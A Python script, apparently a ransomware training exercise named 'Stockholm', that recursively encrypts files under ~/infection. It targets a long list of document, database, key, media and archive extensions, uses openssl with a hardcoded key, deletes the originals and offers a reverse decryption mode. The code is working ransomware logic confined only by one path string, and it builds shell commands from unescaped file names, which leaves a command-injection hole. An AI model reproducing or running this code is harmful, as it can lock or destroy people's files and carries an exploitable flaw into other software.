import os
import argparse
import os
import os


affected_extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max',
	'.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay',
	'.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln',
	'.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php',
	'.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp',
	'.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp',
	'.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx',
	'.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt',
	'.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm',
	'.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']


def	check_file_extension(file):
	for ex in affected_extensions:
		if file.endswith(ex):
			return True
	return False

def	encrypt_file(file, silent, key = '0123456789ABCDEF'):
	if check_file_extension(file):
		os.system('openssl enc -k {} -aes256 -base64 -e -in {} -out {}.ft'.format(key, file, file))
		os.remove(file)
		if not silent:
			print('Encrypting {}'.format(file))

def	encryption(direction, silent, key = '0123456789ABCDEF'):
	ls = os.listdir(direction)
	for file in ls:
		file_path = direction + '/' + file
		if os.path.isdir(file_path):
			encryption(file_path, silent)
		if os.path.isfile(file_path):
			encrypt_file(file_path, silent)

def	decrypt_file(file, silent, key):
	if file.endswith('.ft'):
		os.system('openssl enc -k {} -aes256 -base64 -d -in {} -out {}'.format(key, file, file[:-3]))
		os.remove(file)
		if not silent:
			print('Decrypting {}'.format(file))

def	decryption(direction, silent, key):
	ls = os.listdir(direction)
	for file in ls:
		file_path = direction + '/' + file
		if os.path.isdir(file_path):
			decryption(file_path, silent, key)
		if os.path.isfile(file_path):
			decrypt_file(file_path, silent, key)


def	handle_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument('-v', '--version', action='version', version='Stockholm 1.0.0')
	parser.add_argument('-r', '--reverse', nargs=1, type=str, help = 'decrypts the files')
	parser.add_argument('-s', '--silent', action='store_true', help = 'silent mode', default = False)
	return parser.parse_args()

if __name__ == '__main__':
	args = handle_arguments()
	if args.reverse:
		decryption(os.environ['HOME'] + '/infection', args.silent, args.reverse[0])
	elif not args.reverse:
		encryption(os.environ['HOME'] + '/infection', args.silent)
  
  